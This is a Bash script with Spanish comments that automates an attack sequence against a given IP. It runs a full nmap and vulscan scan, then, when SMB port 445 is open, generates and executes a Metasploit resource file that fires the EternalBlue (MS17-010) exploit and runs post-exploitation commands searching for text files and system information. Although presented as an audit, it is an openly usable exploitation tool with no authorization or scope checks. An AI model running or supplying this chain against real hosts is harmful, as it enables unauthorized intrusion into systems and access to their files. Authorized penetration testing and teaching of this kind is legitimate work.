#!/bin/bash
# ==============================================================================
# Automatización de Secuencia Completa de Auditoría (Versión Pro)
# ==============================================================================

# Asegurar privilegios de root (Nmap -A y MSF los requieren)
if [ "$EUID" -ne 0 ]; then
    echo -e "\e[31m[-] Error: Este script requiere privilegios de root (sudo).\e[0m"
    exit 1
fi

OBJETIVO="$1"
if [ -z "$OBJETIVO" ]; then
    echo -e "\e[31m[-] Error: Falta el objetivo.\e[0m"
    echo "Uso: sudo $0 <IP_Objetivo>"
    exit 1
fi

FECHA=$(date +"%Y%m%d_%H%M%S")
DIR_OUTPUT="sequence_${OBJETIVO}_${FECHA}"
mkdir -p "$DIR_OUTPUT"

# --- PASO 1: Escaneo de puertos avanzado ---
echo -e "\e[34m[*] Paso 1: Escaneando puertos y servicios en $OBJETIVO...\e[0m"
# Guardamos en formato normal (-oN) y grepable (-oG)
nmap -p 1-65535 -T4 -A -v -oN "$DIR_OUTPUT/nmap_report.txt" -oG "$DIR_OUTPUT/nmap_grepable.txt" "$OBJETIVO"

# --- PASO 2: Buscar vulnerabilidades con NSE (Vulscan) ---
echo -e "\e[34m[*] Paso 2: Ejecutando análisis de vulnerabilidades con Vulscan...\e[0m"
# Pasamos la variable $OBJETIVO directamente en lugar de romper el archivo con -iL
nmap --script=vulscan/vulscan.nse -p 445,139 -oN "$DIR_OUTPUT/vulscan_report.txt" "$OBJETIVO"

# --- PASO 3: Intento de explotación con Metasploit (MS17-010) ---
# Verificamos primero si el puerto SMB (445) está abierto en el reporte para no perder tiempo
grep -q "445/open" "$DIR_OUTPUT/nmap_grepable.txt"
if [ $? -eq 0 ]; then
    echo -e "\e[31m[+] Puerto 445 abierto. Intentando explotación EternalBlue...\e[0m"
    
    # Creamos un archivo script de recursos para Metasploit (.rc) para evitar fallos de comillas en Bash
    RESOURCE_FILE="$DIR_OUTPUT/exploit.rc"
    {
        echo "use exploit/windows/smb/ms17_010_eternalblue"
        echo "set RHOSTS $OBJETIVO"
        echo "set DB_ALL_PLATFORMS true"
        # Comando post-explotación automático para descargar un archivo sin usar SCP
        echo "set AutoRunScript multi_console_command -cl 'search -f *.txt','sysinfo'"
        echo "exploit -z" # -z ejecuta en segundo plano si obtiene la sesión
        echo "exit"
    } > "$RESOURCE_FILE"
    
    msfconsole -q -r "$RESOURCE_FILE"
else
    echo -e "\e[33m[-] El puerto 445/SMB está cerrado. Se omite EternalBlue.\e[0m"
fi

echo "----------------------------------------------------------------------"
echo -e "\e[32m[+] Secuencia terminada. Resultados consolidados en: ./$DIR_OUTPUT\e[0m"
